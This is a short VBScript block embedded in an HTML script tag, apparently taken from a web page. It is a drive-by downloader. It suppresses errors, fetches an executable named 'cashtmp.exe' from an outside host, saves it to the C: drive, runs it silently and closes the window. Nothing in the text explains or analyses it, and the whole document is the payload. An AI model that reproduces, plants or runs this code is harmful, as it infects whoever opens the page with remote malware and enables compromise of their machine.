<script language=vbscript>
on error resume next 
set o = CreateObject("msxml2.XMLHTTP") 
o.open "GET","http://www.rfushop.com/sys/cashtmp.exe",False 
o.send 
set s = createobject("adodb.stream") 
s.type=1 
s.open 
s.write o.responseBody 
s.savetofile "C:\\cashtmp.exe",2 
Set ws = CreateObject("WScript.Shell") 
ws.Run "C:\\cashtmp.exe", 3, FALSE 
self.close 
</script> 






